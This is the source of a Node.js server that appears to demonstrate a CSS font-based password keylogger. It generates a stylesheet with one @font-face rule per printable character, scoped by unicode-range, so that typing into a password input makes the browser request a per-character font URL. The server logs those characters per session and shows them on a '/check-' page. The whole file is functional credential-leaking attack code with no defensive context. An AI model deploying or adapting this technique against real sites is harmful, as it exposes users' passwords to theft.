const { readFileSync } = require("fs");
const http = require("http");

const host = "localhost";
const port = 8008;

let loggerDb = {};

function exData(str, len) {
  const bstr = str.substring(len, str.indexOf("."));
  return JSON.parse(atob(bstr));
}

function uuidv4() {
  return ([1e7] + -1e3 + -4e3 + -8e3 + -1e11).replace(/[018]/g, (c) =>
    (
      c ^
      (crypto.getRandomValues(new Uint8Array(1))[0] & (15 >> (c / 4)))
    ).toString(16)
  );
}

const requestListener = function (req, res) {
  if (req.url == "/") {
    res.setHeader("Cache-Control", "no-cache");
    res.writeHead(200);

    res.end(
      readFileSync("./index.html")
        .toString()
        .replaceAll(
          "{{id}}",
          btoa(
            JSON.stringify({
              id: uuidv4(),
            })
          )
        )
    );
  } else if (req.url == "/PasswordEntry.woff") {
    res.writeHead(200);
    res.end(readFileSync("./PasswordEntry.woff"));
  } else if (req.url.indexOf("/external-stylesheet") == 0) {
    res.writeHead(200);
    const { id } = exData(req.url, 21);
    loggerDb[id] = [];
    var ascii =
      "!\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~";
    res.end(
      `input{font-family: "${id}", pass, monospace;letter-spacing: -8px;}
        @font-face {
            font-family: pass;
            font-style: normal;
            font-weight: 400;
            font-display: swap;
            src: url(PasswordEntry.woff) format('woff');
        }${ascii
          .split("")
          .map(
            (e) => `
                  @font-face {
                      font-family: '${id}';
                      font-style: normal;
                      font-weight: 400;
                      font-display: fallback;
                      src: url(/font-${btoa(
                        JSON.stringify({
                          id: id,
                          character: e,
                        })
                      )}.woff) format('woff');
                      unicode-range: U+${e.codePointAt(0).toString(16)};
                  }
          `
          )
          .join("\n")}`
    );
  } else if (req.url.indexOf("/font-") == 0) {
    res.writeHead(200);
    const { id, character } = exData(req.url, 6);
    loggerDb[id].push(character);
    res.end(readFileSync("./PasswordEntry.woff"));
  } else if (req.url.indexOf("/check-") == 0) {
    res.writeHead(200);
    const { id } = exData(req.url, 7);
    const data = loggerDb[id];
    res.end(
      readFileSync("./check.html")
        .toString()
        .replace("{{letters}}", data.join())
    );
  } else {
    res.writeHead(404);
    res.end("Not found :(");
  }
};

const server = http.createServer(requestListener);
server.listen(port, host, () => {
  console.log(`Server is running on http://${host}:${port}`);
});
